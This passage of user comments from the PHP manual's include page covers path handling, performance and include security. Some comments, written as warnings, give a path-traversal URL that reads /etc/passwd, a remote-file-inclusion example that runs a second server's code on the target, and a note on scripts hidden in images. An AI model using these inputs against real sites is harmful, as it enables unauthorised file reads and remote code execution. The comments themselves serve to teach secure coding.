   <strong class="user">abanarn at gmail dot com</strong>
   <a href="#115360" class="date">11-Jul-2014 11:56</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
To Windows coders, if you are upgrading from 5.3 to 5.4 or even 5.5; if you have have coded a path in your require or include you will have to be careful. Your code might not be backward compatible. To be more specific; the code escape for ESC, which is "\e" was introduced in php 5.4.4 + but if you use 5.4.3 you should be fine. For instance:<br />
<br />
Test script:<br />
-------------<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">require(</span><span class="string">"C:\element\scripts\include.php"</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
In php 5.3.* to php 5.4.3<br />
----------------------------<br />
If you use require("C:\element\scripts\include.php")&nbsp; it will work fine.<br />
<br />
If php 5.4.4 + It will break.<br />
------------------------------<br />
Warning: require(C:←lement\scripts\include.php): failed to open stream: In<br />
valid argument in C:\element\scripts\include.php on line 20<br />
<br />
Fatal error: require(): Failed opening required 'C:←lement\scripts\include.php<br />
<br />
Solution:<br />
-----------<br />
Theoretically, you should be always using "\\" instead of "\" when you write php in windows machine OR use "/" like in Linux and you should fine since "\" is an escape character in most programming languages.<br />
If you are not using absolute paths ; stream functions is your best friend like stream_resolve_include_path() , but you need to include the path you are resolving in you php.ini (include_path variable).<br />
<br />
I hope this makes sense and I hope it will someone sometime down the road.<br />
cheers,</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="107685""></a>
  <div class="note">
   <strong class="user">Anon</strong>
   <a href="#107685" class="date">27-Feb-2012 03:31</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();<br />
Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="102731""></a>
  <div class="note">
   <strong class="user">sPlayer</strong>
   <a href="#102731" class="date">02-Mar-2011 06:09</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Sometimes it will be usefull to include a string as a filename
<br />

<br />
<span class="default">&lt;?php
<br />

<br />
</span><span class="comment">//get content
<br />
</span><span class="default">$cFile </span><span class="keyword">= </span><span class="default">file_get_contents</span><span class="keyword">(</span><span class="string">'crypted.file'</span><span class="keyword">);
<br />
</span><span class="comment">//decrypt the content
<br />
</span><span class="default">$content </span><span class="keyword">= </span><span class="default">decrypte</span><span class="keyword">(</span><span class="default">$cFile</span><span class="keyword">);
<br />

<br />
</span><span class="comment">//include this
<br />
</span><span class="keyword">include(</span><span class="string">"data://text/plain;base64,"</span><span class="keyword">.</span><span class="default">base64_encode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));
<br />
</span><span class="comment">//or
<br />
</span><span class="keyword">include(</span><span class="string">"data://text/plain,"</span><span class="keyword">.</span><span class="default">urlencode</span><span class="keyword">(</span><span class="default">$content</span><span class="keyword">));
<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="100553""></a>
  <div class="note">
   <strong class="user">joe dot naylor at gmail dot com</strong>
   <a href="#100553" class="date">22-Oct-2010 11:11</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Be very careful with including files based on user inputed data.&nbsp; For instance, consider this code sample:<br />
<br />
index.php:<br />
<span class="default">&lt;?php<br />
$page </span><span class="keyword">= </span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'page'</span><span class="keyword">];<br />
if (</span><span class="default">file_exists</span><span class="keyword">(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">))<br />
{<br />
&nbsp;&nbsp; include(</span><span class="string">'pages/'</span><span class="keyword">.</span><span class="default">$page</span><span class="keyword">.</span><span class="string">'.php'</span><span class="keyword">);<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
Then go to URL:<br />
index.php?page=/../../../../../../etc/passwd%00.html<br />
<br />
file_exists() will return true, your passwd file will be included and since it's not php code it will be output directly to the browser.<br />
<br />
Of course the same vulnerability exists if you are reading a file to display, as in a templating engine.<br />
<br />
You absolutely have to sanitize any input string that will be used to access the filesystem, you can't count on an absolute path or appended file extension to secure it.&nbsp; Better yet, know exactly what options you can accept and accept only those options.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="94586""></a>
  <div class="note">
   <strong class="user">Chris Bell</strong>
   <a href="#94586" class="date">13-Nov-2009 02:12</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
A word of warning about lazy HTTP includes - they can break your server.<br />
<br />
If you are including a file from your own site, do not use a URL however easy or tempting that may be. If all of your PHP processes are tied up with the pages making the request, there are no processes available to serve the include. The original requests will sit there tying up all your resources and eventually time out.<br />
<br />
Use file references wherever possible. This caused us a considerable amount of grief (Zend/IIS) before I tracked the problem down.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="94392""></a>
  <div class="note">
   <strong class="user">hyponiq at gmail dot com</strong>
   <a href="#94392" class="date">02-Nov-2009 11:12</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I would like to point out the difference in behavior in IIS/Windows and Apache/Unix (not sure about any others, but I would think that any server under Windows will be have the same as IIS/Windows and any server under Unix will behave the same as Apache/Unix) when it comes to path specified for included files.<br />
<br />
Consider the following:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
In IIS/Windows, the file is looked for at the root of the virtual host (we'll say C:\Server\Sites\MySite) since the path began with a forward slash.&nbsp; This behavior works in HTML under all platforms because browsers interpret the / as the root of the server.<br />
<br />
However, Unix file/folder structuring is a little different.&nbsp; The / represents the root of the hard drive or current hard drive partition.&nbsp; In other words, it would basically be looking for root:/Path/To/File.php instead of serverRoot:/Path/To/File.php (which we'll say is /usr/var/www/htdocs).&nbsp; Thusly, an error/warning would be thrown because the path doesn't exist in the root path.<br />
<br />
I just thought I'd mention that.&nbsp; It will definitely save some trouble for those users who work under Windows and transport their applications to an Unix-based server.<br />
<br />
A work around would be something like:<br />
<span class="default">&lt;?php<br />
$documentRoot </span><span class="keyword">= </span><span class="default">null</span><span class="keyword">;<br />
<br />
if (isset(</span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">])) {<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">];<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">) || </span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; if (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'/'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'/'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; elseif (</span><span class="default">strstr</span><span class="keyword">(</span><span class="default">$documentRoot</span><span class="keyword">, </span><span class="string">'\\'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'\\'</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">preg_match</span><span class="keyword">(</span><span class="string">'/[^\\/]{1}\\[^\\/]{1}/'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">preg_replace</span><span class="keyword">(</span><span class="string">'/([^\\/]{1})\\([^\\/]{1})/'</span><span class="keyword">, </span><span class="string">'\\1DIR_SEP\\2'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$documentRoot </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(</span><span class="string">'DIR_SEP'</span><span class="keyword">, </span><span class="string">'\\\\'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
}<br />
else {<br />
&nbsp;&nbsp;&nbsp; </span><span class="comment">/**<br />
&nbsp;&nbsp; &nbsp; * I usually store this file in the Includes folder at the root of my<br />
&nbsp;&nbsp; &nbsp; * virtual host. This can be changed to wherever you store this file.<br />
&nbsp;&nbsp; &nbsp; * <br />
&nbsp;&nbsp; &nbsp; * Example:<br />
&nbsp;&nbsp; &nbsp; * If you store this file in the Application/Settings/DocRoot folder at the<br />
&nbsp;&nbsp; &nbsp; * base of your site, you would change this array to include each of those<br />
&nbsp;&nbsp; &nbsp; * folders.<br />
&nbsp;&nbsp; &nbsp; * <br />
&nbsp;&nbsp; &nbsp; * &lt;code&gt;<br />
&nbsp;&nbsp; &nbsp; * $directories = array(<br />
&nbsp;&nbsp; &nbsp; *&nbsp; &nbsp;&nbsp; 'Application',<br />
&nbsp;&nbsp; &nbsp; *&nbsp; &nbsp;&nbsp; 'Settings',<br />
&nbsp;&nbsp; &nbsp; *&nbsp; &nbsp;&nbsp; 'DocRoot'<br />
&nbsp;&nbsp; &nbsp; * );<br />
&nbsp;&nbsp; &nbsp; * &lt;/code&gt;<br />
&nbsp;&nbsp; &nbsp; */<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$directories </span><span class="keyword">= array(<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="string">'Includes'<br />
&nbsp;&nbsp;&nbsp; </span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; if (</span><span class="default">defined</span><span class="keyword">(</span><span class="string">'__DIR__'</span><span class="keyword">)) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">__DIR__</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; else {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">$currentDirectory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; foreach (</span><span class="default">$directories </span><span class="keyword">as </span><span class="default">$directory</span><span class="keyword">) {<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">str_replace</span><span class="keyword">(<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">DIRECTORY_SEPARATOR </span><span class="keyword">. </span><span class="default">$directory </span><span class="keyword">. </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">,<br />
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; </span><span class="default">$currentDirectory<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">);<br />
&nbsp;&nbsp;&nbsp; }<br />
&nbsp;&nbsp;&nbsp; <br />
&nbsp;&nbsp;&nbsp; </span><span class="default">$currentDirectory </span><span class="keyword">= </span><span class="default">rtrim</span><span class="keyword">(</span><span class="default">$currentDirectory</span><span class="keyword">, </span><span class="default">DIRECTORY_SEPARATOR</span><span class="keyword">);<br />
}<br />
<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'SERVER_DOC_ROOT'</span><span class="keyword">, </span><span class="default">$documentRoot</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
Using this file, you can include files using the defined SERVER_DOC_ROOT constant and each file included that way will be included from the correct location and no errors/warnings will be thrown.<br />
<br />
Example:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="default">SERVER_DOC_ROOT </span><span class="keyword">. </span><span class="string">'/Path/To/File.php'</span><span class="keyword">;<br />
</span><span class="default">?&gt;</span>
</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="86842""></a>
  <div class="note">
   <strong class="user">snowyurik at gmail dot com</strong>
   <a href="#86842" class="date">06-Nov-2008 07:49</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
This might be useful:<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include </span><span class="default">$_SERVER</span><span class="keyword">[</span><span class="string">'DOCUMENT_ROOT'</span><span class="keyword">].</span><span class="string">"/lib/sample.lib.php"</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span>So you can move script anywhere in web-project tree without changes.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="86527""></a>
  <div class="note">
   <strong class="user">Wade.</strong>
   <a href="#86527" class="date">23-Oct-2008 05:20</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you're doing a lot of dynamic/computed includes (&gt;100, say), then you may well want to know this performance comparison: if the target file doesn't exist, then an @include() is *ten* *times* *slower* than prefixing it with a file_exists() check. (This will be important if the file will only occasionally exist - e.g. a dev environment has it, but a prod one doesn't.)<br />
<br />
Wade.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="85862""></a>
  <div class="note">
   <strong class="user">example at user dot com</strong>
   <a href="#85862" class="date">22-Sep-2008 06:33</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
Just about any file type can be 'included' or 'required'.&nbsp; By sending appropriate headers, like in the below example, the client would normally see the output in their browser as an image or other intended mime type.<br />
<br />
You can also embed text in the output, like in the example below.&nbsp; But an image is still an image to the client's machine.&nbsp; The client must open the downloaded file as plain/text to see what you embedded.<br />
<br />
<span class="default">&lt;?php <br />
<br />
header</span><span class="keyword">(</span><span class="string">'Content-type: image/jpeg'</span><span class="keyword">);<br />
</span><span class="default">header</span><span class="keyword">(</span><span class="string">'Content-Disposition: inline;'</span><span class="keyword">);<br />
<br />
include </span><span class="string">'/some_image.jpg'</span><span class="keyword">;<br />
echo </span><span class="string">'This file was provided by example@user.com.'</span><span class="keyword">;<br />
<br />
</span><span class="default">?&gt;<br />
</span><br />
Which brings us to a major security issue.&nbsp; Scripts can be hidden within images or files using this method.&nbsp; For example, instead echoing "<span class="default">&lt;?php phpinfo</span><span class="keyword">(); </span><span class="default">?&gt;</span>", a foreach/unlink loop through the entire filesystem, or some other method of disabling security on your machine.<br />
<br />
'Including' any file made this way will execute those scripts.&nbsp; NEVER 'include' anything that you found on the web or that users upload or can alter in any way.&nbsp; Instead, use something a little safer to display the found file, like "echo file_get_contents('/some_image.jpg');"</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="83066""></a>
  <div class="note">
   <strong class="user">Rick Garcia</strong>
   <a href="#83066" class="date">08-May-2008 06:38</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:<br />
<br />
----<br />
<span class="default">&lt;?php </span><span class="comment">// prepend.php - autoprepended at the top of your tree<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'MAINDIR'</span><span class="keyword">,</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/'</span><span class="keyword">);<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'DL_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'downloads/'</span><span class="keyword">);<br />
</span><span class="default">define</span><span class="keyword">(</span><span class="string">'LIB_DIR'</span><span class="keyword">,</span><span class="default">MAINDIR </span><span class="keyword">. </span><span class="string">'lib/'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>----<br />
<br />
and so on. This way, the files in your framework will only have to issue statements such as this:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">require_once(</span><span class="default">LIB_DIR </span><span class="keyword">. </span><span class="string">'excel_functions.php'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
This also frees you from having to check the include path each time you do an include.<br />
<br />
If you're running scripts from below your main web directory, put a prepend.php file in each subdirectory:<br />
<br />
--<br />
<span class="default">&lt;?php<br />
</span><span class="keyword">include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">)) . </span><span class="string">'/prepend.php'</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span>--<br />
<br />
This way, the prepend.php at the top always gets executed and you'll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="81367""></a>
  <div class="note">
   <strong class="user">uramihsayibok, gmail, com</strong>
   <a href="#81367" class="date">25-Feb-2008 02:28</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I have a need to include a lot of files, all of which are contained in one directory. Support for things like <span class="default">&lt;?php </span><span class="keyword">include_once </span><span class="string">'dir/*.php'</span><span class="keyword">; </span><span class="default">?&gt;</span> would be nice, but it doesn't exist.<br />
<br />
Therefore I wrote this quick function (located in a file automatically included by auto_prepend_file):<br />
<span class="default">&lt;?php<br />
<br />
</span><span class="keyword">function </span><span class="default">include_all_once </span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) {<br />
&nbsp;&nbsp;&nbsp; foreach (</span><span class="default">glob</span><span class="keyword">(</span><span class="default">$pattern</span><span class="keyword">) as </span><span class="default">$file</span><span class="keyword">) { </span><span class="comment">// remember the { and } are necessary!<br />
&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; </span><span class="keyword">include </span><span class="default">$file</span><span class="keyword">;<br />
&nbsp;&nbsp;&nbsp; }<br />
}<br />
<br />
</span><span class="comment">// used like<br />
</span><span class="default">include_all_once</span><span class="keyword">(</span><span class="string">'dir/*.php'</span><span class="keyword">);<br />
<br />
</span><span class="default">?&gt;<br />
</span>A fairly obvious solution. It doesn't deal with relative file paths though; you still have to do that yourself.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="73148""></a>
  <div class="note">
   <strong class="user">mbread at m-bread dot com</strong>
   <a href="#73148" class="date">10-Feb-2007 06:23</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
If you have a problem with "Permission denied" errors (or other permissions problems) when including files, check:<br />
<br />
1) That the file you are trying to include has the appropriate "r" (read) permission set, and<br />
2) That all the directories that are ancestors of the included file, but not of the script including the file, have the appropriate "x" (execute/search) permission set.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="42906""></a>
  <div class="note">
   <strong class="user">durkboek A_T hotmail D_O_T com</strong>
   <a href="#42906" class="date">03-Jun-2004 01:09</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
I would like to emphasize the danger of remote includes. For example:<br />
Suppose, we have a server A with Linux and PHP 4.3.0 or greater installed which has the file index.php with the following code:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="comment">// File: index.php<br />
</span><span class="keyword">include (</span><span class="default">$_GET</span><span class="keyword">[</span><span class="string">'id'</span><span class="keyword">].</span><span class="string">".php"</span><span class="keyword">);<br />
</span><span class="default">?&gt;<br />
</span><br />
This is, of course, not a very good way to program, but i actually found a program doing this.<br />
<br />
Then, we hava a server B, also Linux with PHP installed, that has the file list.php with the following code:<br />
<br />
<span class="default">&lt;?php<br />
</span><span class="comment">// File: list.php<br />
</span><span class="default">$output </span><span class="keyword">= </span><span class="string">""</span><span class="keyword">;<br />
</span><span class="default">exec</span><span class="keyword">(</span><span class="string">"ls -al"</span><span class="keyword">,</span><span class="default">$output</span><span class="keyword">);<br />
foreach(</span><span class="default">$output </span><span class="keyword">as </span><span class="default">$line</span><span class="keyword">) {<br />
echo </span><span class="default">$line </span><span class="keyword">. </span><span class="string">"&lt;br&gt;\n"</span><span class="keyword">;<br />
}<br />
</span><span class="default">?&gt;<br />
</span><br />
If index.php on Server A is called like this: <a href="http://server_a/index.php?id=http://server_b/list" rel="nofollow" target="_blank">http://server_a/index.php?id=http://server_b/list</a><br />
then Server B will execute list.php and Server A will include the output of Server B, a list of files.<br />
<br />
But here's the trick: if Server B doesn't have PHP installed, it returns the file list.php to Server A, and Server A executes that file. Now we have a file listing of Server A! <br />
I tried this on three different servers, and it allways worked.<br />
This is only an example, but there have been hacks uploading files to servers etc.<br />
<br />
So, allways be extremely carefull with remote includes.</span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
  <a name="38128""></a>
  <div class="note">
   <strong class="user">james at gogo dot co dot nz</strong>
   <a href="#38128" class="date">09-Dec-2003 07:03</a>
   <div class="text">
    <div class="phpcode">
<code><span class="html">
While you can return a value from an included file, and receive the value as you would expect, you do not seem to be able to return a reference in any way (except in array, references are always preserved in arrays).<br />
<br />
For example, we have two files, file 1.php contains...<br />
<span class="default">&lt;?php<br />
&nbsp; </span><span class="keyword">function &amp;</span><span class="default">x</span><span class="keyword">(&amp;</span><span class="default">$y</span><span class="keyword">)<br />
&nbsp; {<br />
&nbsp;&nbsp;&nbsp; return include(</span><span class="default">dirname</span><span class="keyword">(</span><span class="default">__FILE__</span><span class="keyword">) . </span><span class="string">'/2.php'</span><span class="keyword">);<br />
&nbsp; }<br />
<br />
&nbsp; </span><span class="default">$z </span><span class="keyword">= </span><span class="string">"FOO\n"</span><span class="keyword">;<br />
&nbsp; </span><span class="default">$z2 </span><span class="keyword">= &amp;</span><span class="default">x</span><span class="keyword">(</span><span class="default">$z</span><span class="keyword">);<br />
<br />
&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br />
&nbsp; </span><span class="default">$z&nbsp; </span><span class="keyword">= </span><span class="string">"NOO\n"</span><span class="keyword">;<br />
&nbsp; <br />
&nbsp; echo </span><span class="default">$z2</span><span class="keyword">;<br />
</span><span class="default">?&gt;<br />
</span><br />
and file 2.php contains...<br />
<span class="default">&lt;?php&nbsp; </span><span class="keyword">return </span><span class="default">$y</span><span class="keyword">; </span><span class="default">?&gt;<br />
</span><br />
calling 1.php will produce<br />
<br />
FOO<br />
FOO<br />
<br />
i.e the reference passed to x() is broken on it's way out of the include()<br />
<br />
Neither can you do something like <span class="default">&lt;?php $foo </span><span class="keyword">=&amp; include(....); </span><span class="default">?&gt;</span> as that's a parse error (include is not a real function, so can't take a reference in that case).&nbsp; And you also can't do <span class="default">&lt;?php </span><span class="keyword">return &amp;</span><span class="default">$foo ?&gt;</span> in the included file (parse error again, nothing to assign the reference too).<br />
<br />
The only solutions are to set a variable with the reference which the including code can then return itself, or return an array with the reference inside.<br />
<br />
---<br />
James Sleeman<br />
<a href="http://www.gogo.co.nz/" rel="nofollow" target="_blank">http://www.gogo.co.nz/</a></span>
</code>
    </div>
   </div>
  </div>
 <div class="foot"></div>
</div>
</div>
<hr /><div class="manualnavbar" style="text-align: center;">
 <div class="prev" style="text-align: left; float: left;"><a href="function.require.html">require</a></div>
 <div class="next" style="text-align: right; float: right;"><a href="function.require-once.html">require_once</a></div>
 <div class="up"><a href="language.control-structures.html">制御構造</a></div>
 <div class="home"><a href="index.html">PHP Manual</a></div>
</div></body></html>
